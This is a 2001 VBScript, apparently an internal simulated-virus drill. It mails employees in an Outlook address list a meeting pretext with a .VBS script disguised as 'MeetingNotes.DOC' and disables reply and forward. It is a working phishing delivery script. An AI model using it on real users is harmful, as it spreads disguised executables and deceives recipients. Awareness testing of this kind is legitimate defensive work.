'---
'--- SendVirusMessages.VBS
'---
'--- 2/23/2001 (BS)
'---
'--- Creates and sends message to send to target users, with 
'---   attachment added with a different displayname.
'---

If MsgBox("You are about to send 'Virus' EMails to all users in the All WC&P Address list (about a thousand users) - Do you want to do this?", vbYesNo, "FIRST WARNING!!!!!") = vbYes Then
   If MsgBox("You are about to send 'Virus' EMails to all users in the All WC&P Address list (about a thousand users) - Do you want to do this?", vbYesNo, "SECOND WARNING!!!!!") = vbYes Then
      DoIt
   Else
      MsgBox "Cancelled - no emails generated or sent"
   End If
Else
   MsgBox "Cancelled - no emails generated or sent"
End If

Sub DoIt()
   Dim loOutlookApplication ' As Outlook.Application
   Dim loMAPINameSpace      ' As Outlook.NameSpace
   Dim loAddressList        ' As Outlook.AddressList
   Dim loAddressEntry       ' As Outlook.AddressEntry
   Dim llCntAllEntries      ' As Long
   Dim llCntUserEntries     ' As Long
   Dim llEntryDispType      ' As Long
   Dim lsAddressName        ' As String
   Dim loFSO                ' As Scripting.FileSystemObject
   Dim loFile               ' As Scripting.TextStream
   Dim loMailItem           ' As Outlook.MailItem
   Dim loMailAttachment     ' As Outlook.Attachment
   Dim llCntErrors          ' As Long
   Dim llCntSent            ' As Long
   Dim llCntIgnBlank        ' As Long
   Dim llCntIgnPrefix       ' As Long

   '--- Start logging actions
   Set loFSO = WScript.CreateObject("Scripting.FileSystemObject")
   Set loFile = loFSO.OpenTextFile ("\\DCNT1\review\SPA _Temporary\Development\Programming\_Tools\ImAnIdiot_Virus\20010223\SendVirusMessages.LOG", 2, True)
   loFile.WriteLine "Sending ImAnIdiot virus.  Starting: " & Now
   loFile.WriteLine ""

   '--- Connect to Outlook
   Set loOutlookApplication=WScript.CreateObject("Outlook.Application")
   Set loMAPINameSpace=loOutlookApplication.GetNameSpace("MAPI")

   llCntUserEntries = 0
   llCntAllEntries = 0
   llCntErrors = 0
   llCntSent = 0
   llCntIgnBlank = 0
   llCntIgnPrefix = 0

   Set loAddressList = loMAPINameSpace.AddressLists("All WC&P")
   If loAddressList is Nothing Then
      MsgBox "Error: Couldn't find AddressList: All WC&P"
      loFile.WriteLine "Error: Couldn't find AddressList: All WC&P"
      loFile.WriteLine ""
   Else
      loFile.WriteLine "User Entries from 'All WC&P' Address list:"
      For Each loAddressEntry in loAddressList.AddressEntries
         llEntryDispType = -1
         lsAddressName = ""
         On Error Resume Next ' Next line sometimes bombs (for weird types?)
         llEntryDispType = loAddressEntry.DisplayType
         lsAddressName = loAddressEntry.Name
         On Error Goto 0
         If llEntryDispType = 0 Then  ' olUser=0
            lsAddressName = Trim(lsAddressName)
If lsAddressName <> "Sanfelici, Brian" then
lsAddressName = ""
end if
            If lsAddressName = "" Then
               llCntIgnBlank = llCntIgnBlank + 1
            ElseIf Left(lsAddressName,1) = "*" Or _
                   Left(lsAddressName,1) = "^" Then
               llCntIgnPrefix = llCntIgnPrefix + 1
            Else
               llCntAllEntries = llCntAllEntries + 1
               '--- ----------------------
               '--- Create email
               '--- ----------------------
               Set loMailItem = loOutlookApplication.CreateItem(0)
               loMailItem.Recipients.Add lsAddressName
               loMailItem.Subject = "Document for upcoming meeting"
               loMailItem.Body = "The attached document will help you prepare for the upcoming meeting." & vbcrlf & "Please review it prior to the meeting." & vbcrlf & vbcrlf
               loMailItem.ExpiryTime = Date + 4  '  Automatically delete message after 4 days
               '  Disable user's ability to reply / forward email
               loMailItem.Actions("Reply").Enabled = False
               loMailItem.Actions("Reply to All").Enabled = False
               loMailItem.Actions("Forward").Enabled = False
               loMailItem.Actions("Reply to Folder").Enabled = False
               loMailItem.AlternateRecipientAllowed = False
               loMailItem.RecipientReassignmentProhibited = False
               '--- Attach file  (olByValue = 1)
               Set loMailAttachment = loMailItem.Attachments.Add("\\DCNT1\review\SPA _Temporary\Development\Programming\_Tools\ImAnIdiot_Virus\20010223\20010223.VBS", 1, ,"MeetingNotes.DOC")
               loMailItem.Categories = "Test20010223"
 
               '--- ----------------------
               '--- Send email
               '--- ----------------------
               If loMailItem.Recipients.ResolveAll() Then
                  On Error Resume Next
                  Err.Clear
                  loMailItem.Send
                  If Err.Number = 0 Then
                     loFile.WriteLine "   Resolved and sent: " & lsAddressName 
                     llCntSent = llCntSent + 1
                  Else
                     loFile.WriteLine "   ERROR: Resolved and not sent: " & lsAddressName & " (Err: " & Err.Number & " " & Err.Description & ")"
                     llCntErrors = llCntErrors + 1
                  End If
               Else
                  loFile.WriteLine "   ERROR: Not Resolved: " & lsAddressName
                  llCntErrors = llCntErrors + 1
               End if

               Set loMailItem = Nothing

               llCntUserEntries = llCntUserEntries + 1
               loFile.WriteLine lsAddressName
            End If
         End If
      Next
      loFile.WriteLine ""
      loFile.WriteLine "Total All WC&P entries: " & loAddressList.AddressEntries.Count
      loFile.WriteLine "User entries:           " & llCntUserEntries
      loFile.WriteLine "Ignored (blank):        " & llCntIgnBlank
      loFile.WriteLine "Ignored (*|^ prefix:    " & llCntIgnPrefix
      loFile.WriteLine "Emails sent:            " & llCntSent
      loFile.WriteLine "ERRORs:                 " & llCntErrors
      loFile.WriteLine ""
      loFile.WriteLine "Done: " & Now
   End If

   loFile.Close

   Set loFile = Nothing
   Set loFSO = Nothing
   Set loAddressList = Nothing
   Set loMAPINameSpace = Nothing
   Set loOutlookApplication = Nothing
End Sub